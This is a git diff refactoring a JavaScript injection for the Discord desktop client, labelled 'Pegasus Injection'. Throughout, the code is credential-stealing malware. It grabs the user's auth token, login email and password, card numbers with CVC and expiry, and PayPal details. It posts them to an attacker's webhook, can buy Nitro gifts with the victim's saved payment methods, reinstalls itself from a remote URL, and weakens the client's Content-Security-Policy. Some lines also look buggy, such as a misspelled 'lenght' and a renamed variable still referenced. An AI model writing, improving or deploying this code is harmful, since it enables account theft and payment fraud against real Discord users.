@@ -1,19 +1,19 @@
 const args = process.argv;
 const fs = require("fs");
 const path = require("path");
+const https = require("https");
 const querystring = require("querystring");
 const { BrowserWindow, session } = require("electron");
 
 const config = {
+  webhook: "%WEBHOOK%", //your discord webhook there obviously
   auto_buy_nitro: false, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
   ping_on_run: true, //sends whatever value you have in ping_val when you get a run/login
-  ping_val: '@here', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
-  embed_name: 'Pegasus Injection', //name of the webhook thats gonna send the info
-  embed_icon: 'https://media.discordapp.net/attachments/798245111070851105/930314565454004244/IMG_2575.jpg'.replace(/ /g,'%20'), 
+  ping_val: "@here", //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
+  embed_name: "Pegasus Injection", //name of the webhook thats gonna send the info
+  embed_icon: "https://media.discordapp.net/attachments/798245111070851105/930314565454004244/IMG_2575.jpg".replace(/ /g, "%20"), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 14423100, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-  webhook: "%WEBHOOK%", //your discord webhook there obviously
-  injection_url: 'https://raw.githubusercontent.com/addi00000/pegasus/main/inject.js', //injection url for when it reinjects
-  /* DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING */
+  injection_url: "https://raw.githubusercontent.com/addi00000/pegasus/main/inject.js", //injection url for when it reinjects
   api: "https://discord.com/api/v9/users/@me",
   nitro: {
     boost: {
@@ -63,50 +63,26 @@ const config = {
 };
 
 const discordPath = (function () {
-  const useRelease = args[2] && args[2].toLowerCase() === "release";
-  const releaseInput = useRelease
-    ? args[3] && args[3].toLowerCase()
-    : args[2] && args[2].toLowerCase();
-  const release =
-    releaseInput === "canary"
-      ? "Discord Canary"
-      : releaseInput === "ptb"
-      ? "Discord PTB"
-      : "Discord";
-  let resourcePath = "";
-  if (process.platform === "win32") {
-    const basedir = path.join(process.env.LOCALAPPDATA, release.replace(/ /g, ""));
-    const version = fs
-      .readdirSync(basedir)
-      .filter((f) => fs.lstatSync(path.join(basedir, f)).isDirectory() && f.split(".").length > 1)
-      .sort()
-      .reverse()[0];
-    resourcePath = path.join(basedir, version, "resources");
-  } else if (process.platform === "darwin") {
-    const appPath =
-      releaseInput === "canary"
-        ? path.join("/Applications", "Discord Canary.app")
-        : releaseInput === "ptb"
-        ? path.join("/Applications", "Discord PTB.app")
-        : useRelease && args[3]
-        ? args[3]
-          ? args[2]
-          : args[2]
-        : path.join("/Applications", "Discord.app");
+  const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
+  let resourcePath;
 
-    resourcePath = path.join(appPath, "Contents", "Resources");
+  if (process.platform === "win32") {
+    resourcePath = path.join(app, "resources");
+  } else if (process.platform === "darwin") {
+    resourcePath = path.join(app, "Contents", "Resources");
   }
 
-  if (fs.existsSync(resourcePath)) return resourcePath;
-  return "";
+  if (fs.existsSync(resourcePath)) return { resourcePath, app };
+  return { undefined, undefined };
 })();
 
 function updateCheck() {
-  const appPath = path.join(discordPath, "app");
+  const { resourcePath, app } = discordPath;
+  if (resourcePath === undefined || app === undefined) return;
+  const appPath = path.join(resourcePath, "app");
   const packageJson = path.join(appPath, "package.json");
   const resourceIndex = path.join(appPath, "index.js");
-  const parentDir = path.resolve(path.resolve(__dirname, ".."), "..");
-  const indexJs = `${parentDir}\\discord_desktop_core-2\\discord_desktop_core\\index.js`;
+  const indexJs = `${app}\\modules\\discord_desktop_core-3\\discord_desktop_core\\index.js`;
   const bdPath = path.join(process.env.APPDATA, "\\betterdiscord\\data\\betterdiscord.asar");
   if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
   if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
@@ -117,7 +93,7 @@ function updateCheck() {
       packageJson,
       JSON.stringify(
         {
-          name: "Discord-Injection",
+          name: "discord",
           main: "index.js",
         },
         null,
@@ -136,6 +112,7 @@ fs.readFileSync(indexJs, 'utf8', (err, data) => {
 async function init() {
     https.get('${config.injection_url}', (res) => {
         const file = fs.createWriteStream(indexJs);
+        res.replace('%WEBHOOK%', '${config.webhook}')
         res.pipe(file);
         file.on('finish', () => {
             file.close();
@@ -145,10 +122,8 @@ async function init() {
         setTimeout(init(), 10000);
     });
 }
-require('${path.join(discordPath, "app.asar")}')
-if (fs.existsSync(bdPath)) {
-    require(bdPath);
-}`;
+require('${path.join(resourcePath, "app.asar")}')
+if (fs.existsSync(bdPath)) require(bdPath);`;
     fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, "\\\\"));
   }
   if (!fs.existsSync(path.join(__dirname, "initiation"))) return !0;
@@ -179,45 +154,46 @@ const fetchBilling = async (token) => {
     xmlHttp.setRequestHeader("Authorization", "${token}"); 
     xmlHttp.send(null); 
     xmlHttp.responseText`);
-  if (bill.length === 0 && !bill.lenght) {
-    return "";
-  }
+  if (!bill.lenght || bill.length === 0) return "";
   return JSON.parse(bill);
 };
 
 const getBilling = async (token) => {
   const data = await fetchBilling(token);
-  if (data === "") return "❌";
+  if (!data) return "❌";
   let billing = "";
   data.forEach((x) => {
-    if (x.type === 2 && !x.invalid) {
-      billing += "✅" + " <:paypal:951139189389410365>";
-    } else if (x.type === 1 && !x.invalid) {
-      billing += "✅" + " 💳";
-    } else {
-      billing = "❌";
+    if (!x.invalid) {
+      switch (x.type) {
+        case 1:
+          billing += "💳 ";
+          break;
+        case 2:
+          billing += "<:paypal:951139189389410365> ";
+          break;
+      }
     }
   });
-  if (billing === "") billing = "❌";
+  if (!billing) billing = "❌";
   return billing;
 };
 
 const Purchase = async (token, id, _type, _time) => {
+  const options = {
+    expected_amount: config.nitro[_type][_time]["price"],
+    expected_currency: "usd",
+    gift: true,
+    payment_source_id: id,
+    payment_source_token: null,
+    purchase_token: "2422867c-244d-476a-ba4f-36e197758d97",
+    sku_subscription_plan_id: config.nitro[_type][_time]["sku"],
+  };
+
   const req = execScript(`var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${
-      config.nitro[_type][_time]["id"]
-    }/purchase", false);
+    xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${config.nitro[_type][_time]["id"]}/purchase", false);
     xmlHttp.setRequestHeader("Authorization", "${token}");
     xmlHttp.setRequestHeader('Content-Type', 'application/json');
-    xmlHttp.send(JSON.stringify(${JSON.stringify({
-      expected_amount: config.nitro[_type][_time]["price"],
-      expected_currency: "usd",
-      gift: true,
-      payment_source_id: id,
-      payment_source_token: null,
-      purchase_token: "2422867c-244d-476a-ba4f-36e197758d97",
-      sku_subscription_plan_id: config.nitro[_type][_time]["sku"],
-    })}));
+    xmlHttp.send(JSON.stringify(${JSON.stringify(options)}));
     xmlHttp.responseText`);
   if (req["gift_code"]) {
     return "https://discord.gift/" + req["gift_code"];
@@ -226,7 +202,8 @@ const Purchase = async (token, id, _type, _time) => {
 
 const buyNitro = async (token) => {
   const data = await fetchBilling(token);
-  if (data === "") return "Failed to Purchase ❌";
+  const failedMsg = "Failed to Purchase ❌";
+  if (!data) return failedMsg;
 
   let IDS = [];
   data.forEach((x) => {
@@ -247,7 +224,7 @@ const buyNitro = async (token) => {
         if (third !== null) {
           return third;
         } else {
-          return "Failed to Purchase ❌";
+          return failedMsg;
         }
       }
     }
@@ -310,13 +287,26 @@ const getBadges = (flags) => {
   return badges;
 };
 
-const hooker = (content) => {
-  execScript(`var xhr = new XMLHttpRequest();
-    xhr.open("POST", "${config.webhook}", true);
-    xhr.setRequestHeader('Content-Type', 'application/json');
-    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
-    xhr.send(JSON.stringify(${JSON.stringify(content)}));
-`);
+const hooker = async (content) => {
+  const data = JSON.stringify(content);
+  const url = new URL(config.webhook);
+  const options = {
+    protocol: url.protocol,
+    hostname: url.host,
+    path: url.pathname,
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+      "Access-Control-Allow-Origin": "*",
+    },
+  };
+  const req = https.request(options);
+
+  req.on("error", (err) => {
+    console.log(err);
+  });
+  req.write(data);
+  req.end();
 };
 
 const login = async (email, password, token) => {
@@ -573,17 +563,8 @@ const nitroBought = async (token) => {
   hooker(content);
 };
 session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
-  if (details.url.startsWith("wss://remote-auth-gateway")) {
-    callback({
-      cancel: true,
-    });
-    return;
-  }
-  if (updateCheck()) {
-  }
-
-  callback({});
-  return;
+  if (details.url.startsWith("wss://remote-auth-gateway")) return callback({ cancel: true });
+  updateCheck();
 });
 
 session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
@@ -601,11 +582,7 @@ session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
       callback({
         responseHeaders: Object.assign(
           {
-            "Content-Security-Policy": [
-              "default-src '*'",
-              "Access-Control-Allow-Headers '*'",
-              "Access-Control-Allow-Origin '*'",
-            ],
+            "Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
             "Access-Control-Allow-Headers": "*",
             "Access-Control-Allow-Origin": "*",
           },
@@ -628,13 +605,8 @@ session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
 
 session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
   if (details.statusCode !== 200 && details.statusCode !== 202) return;
-  const unparsedData = details.uploadData[0].bytes;
-  let data;
-  try {
-    data = JSON.parse(Buffer.from(unparsedData).toString());
-  } catch (SyntaxError) {
-    data = JSON.parse(JSON.stringify(Buffer.from(unparsedData).toString()));
-  }
+  const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
+  const data = JSON.parse(unparsed_data);
   const token = await execScript(
     `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,
   );
@@ -655,13 +627,7 @@ session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) 
 
     case details.url.endsWith("tokens") && details.method === "POST":
       const item = querystring.parse(unparsedData.toString());
-      ccAdded(
-        item["card[number]"],
-        item["card[cvc]"],
-        item["card[exp_month]"],
-        item["card[exp_year]"],
-        token,
-      ).catch(console.error);
+      ccAdded(item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], token).catch(console.error);
       break;
 
     case details.url.endsWith("paypal_accounts") && details.method === "POST":
